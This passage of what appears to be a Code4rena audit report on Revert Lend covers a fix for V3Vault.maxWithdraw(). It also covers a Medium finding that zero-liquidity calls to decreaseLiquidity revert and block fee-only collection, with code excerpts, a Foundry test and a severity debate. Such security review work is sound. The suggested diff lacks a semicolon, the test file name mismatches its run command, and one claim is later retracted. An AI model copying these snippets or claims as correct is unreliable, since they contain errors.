Refactor `V3Vault::maxWithdraw()` so that it does not convert `balance` to assets a second time:

```solidity
  function maxWithdraw(address owner) external view override returns (uint256) {
        ....
        if (balance > ownerAssetBalance) {
            return ownerAssetBalance;
        } else {
-            return _convertToAssets(balance, lendExchangeRateX96, Math.Rounding.Down);
+            return balance
        }
    }
```

### Assessed type

Math

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/63#issuecomment-2083689746)**

***

## [Some functions don't check if `liquidity > 0` before calling `decreaseLiquidity`](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/47)

*Submitted by [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/47)*

**Severity: Medium**

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L654-L658

### Impact

- Users cannot just collect UniswapV3 fees alone.
- Users cannot call `leverageDown` with fee alone.

### Proof of concept

One of the most important features of Revert Lend is that it allows user to take loans using UniswapV3 positions as collateral while at the same time able to manage their positions; this includes collecting fees, decrease liquidity, increase liquidity, as documented [here](https://docs.revert.finance/revert/technical-docs/auto-compounder/manage-positions)

However, the current implementation will not allow user to just collect fees. `V3Vault` contains a function called `decreaseLiquidityAndCollect`:

```solidity
function decreaseLiquidityAndCollect(DecreaseLiquidityAndCollectParams calldata params)
        external
        override
        returns (uint256 amount0, uint256 amount1)
    {
     ...
     (amount0, amount1) = nonfungiblePositionManager.decreaseLiquidity(
            INonfungiblePositionManager.DecreaseLiquidityParams(
                params.tokenId, params.liquidity, params.amount0Min, params.amount1Min, params.deadline
            )
        );
     ...
    }
```

As you can see in the above code, the function will call `decreaseLiquidity` without checking if `liquidity` to be removed `>0`; if `liquidity = 0`, then `decreaseLiquidity` will revert. Below is the UniswapV3 `NonfungibleTokenManager` code for this situation:

https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L265

```solidity
 function decreaseLiquidity(DecreaseLiquidityParams calldata params)
        external
        payable
        override
        isAuthorizedForToken(params.tokenId)
        checkDeadline(params.deadline)
        returns (uint256 amount0, uint256 amount1)
    {
        require(params.liquidity > 0);
}
```

Using `V3Utils` transformation will not allow users to just collect fees either. The function `V3Utils.execute` does check if `liquidity >0` and collect fees:

```solidity
function execute(uint256 tokenId, Instructions memory instructions) public returns (uint256 newTokenId) {
        _validateCaller(nonfungiblePositionManager, tokenId);

        (,, address token0, address token1,,,, uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);

        uint256 amount0;
        uint256 amount1;
        if (instructions.liquidity != 0) {
            (amount0, amount1) = _decreaseLiquidity(
                tokenId,
                instructions.liquidity,
                instructions.deadline,
                instructions.amountRemoveMin0,
                instructions.amountRemoveMin1
            );
        }
        (amount0, amount1) = _collectFees(
            tokenId,
            IERC20(token0),
            IERC20(token1),
            instructions.feeAmount0 == type(uint128).max
                ? type(uint128).max
                : (amount0 + instructions.feeAmount0).toUint128(),
            instructions.feeAmount1 == type(uint128).max
                ? type(uint128).max
                : (amount1 + instructions.feeAmount1).toUint128()
        );
}
```

However, after this `V3Utils` only supports 3 modes and each of these forces users to do something else beside collecting fees:
- `CHANGE_RANGE` mode forces users to mint a new UniswapV3 position.
- `WITHDRAW_AND_COLLECT_AND_SWAP` forces users to swap tokens.
- `COMPOUND_FEES` forces users to use all collected fee to increase liquidity.

In summary, `V3Vault` and `V3Utils` won't let users collect their positions fees alone; an important feature in Revert Lend system.

One more part this is not checked is in function `LeverageTransformer.leverageDown`:

```solidity
function leverageDown(LeverageDownParams calldata params) external {
...
INonfungiblePositionManager.DecreaseLiquidityParams memory decreaseLiquidityParams = INonfungiblePositionManager
            .DecreaseLiquidityParams(
            params.tokenId, params.liquidity, params.amountRemoveMin0, params.amountRemoveMin1, params.deadline
        );
        (amount0, amount1) = nonfungiblePositionManager.decreaseLiquidity(decreaseLiquidityParams);
...
}
```

If a user pass in `LeverageDownParams.liquidity = 0`, that means they just want to use UniswapV3 collect fees to repay their debt in `V3Vault`, yet in this situation they are forced to decrease their position.


Below is a POC for this issue, save this test case to file `V3Oracle.t.my.sol` and run it using command:

`forge test --match-path test/integration/V3Vault.t.sol --match-test testCannotCollect -vvvv`

```solidity
function testCannotCollect() external {
        uint256 minLoanSize = 1000000;

        vault.setLimits(1000000, 15000000, 15000000, 15000000, 15000000);

        // lend 10 USDC
        _deposit(10000000, WHALE_ACCOUNT);

        // add collateral
        vm.startPrank(TEST_NFT_ACCOUNT);
        NPM.approve(address(vault), TEST_NFT);

        vault.create(TEST_NFT, TEST_NFT_ACCOUNT);
        // Borrow
        vault.borrow(TEST_NFT, minLoanSize);

        // Cannot just collect by setting decrease liquidity = 0
        IVault.DecreaseLiquidityAndCollectParams memory params = IVault.DecreaseLiquidityAndCollectParams(
            TEST_NFT,
            0, // liquidity to remove
            0,
            0,
            type(uint128).max,
            type(uint128).max,
            block.timestamp,
            TEST_NFT_ACCOUNT
        );
        vm.expectRevert();
        vault.decreaseLiquidityAndCollect(params);

        // Users are forced to remove some liquidity
        params = IVault.DecreaseLiquidityAndCollectParams(
            TEST_NFT,
            1, // liquidity to remove
            0,
            0,
            type(uint128).max,
            type(uint128).max,
            block.timestamp,
            TEST_NFT_ACCOUNT
        );
        vault.decreaseLiquidityAndCollect(params);

        vm.stopPrank();



    }
```

### Recommended Mitigation

In function `V3Vault.decreaseLiquidityAndCollect`, the code should check if `liquidity > 0`, if not, `decreaseLiquidity` should not be called. This allow the user to collect fees.

### Assessed type

Invalid Validation

**[kalinbas (Revert) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/47#issuecomment-2083660083):**
> There is no medium risk here, in my opinion. But yes, it is a good finding.

**[ktg (warden) commented](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/47#issuecomment-2083991632):**
> In my opinion, this does qualify as medium risk because it forces the users to decrease their liquidity in order to collect their fees. In this issue, one of the main features of the protocol (that is allowing collecting fees alone, or allowing to use only fees for `leverageDown`) is affected.

**[kalinbas (Revert) commented](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/47#issuecomment-2085547908):**
> Yeah I agree, it is a main feature. But with V3Utils you can collect fees only when `liquidity == 0`. So it is actually possible to collect fees only. I keep my opinion this should not be a medium risk.
>
> `WITHDRAW_AND_COLLECT_AND_SWAP` doesnt force them to swap.

**[ktg (warden) commented](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/47#issuecomment-2087712324):**
> xYou're totally right, I'm sorry I'm mistaken,
`WITHDRAW_AND_COLLECT_AND_SWAP` doesnt force them to swap. Now, the only problem is `leverageDown` forces user to decrease liquidity but I understand if you keep your opinion.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/47#issuecomment-2091056611):**
> I am more inclined to maintain the Medium severity. Although this issue does not cause any value leakage, the standalone fee collection is a key function, which meets the criteria for key functionality errors.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
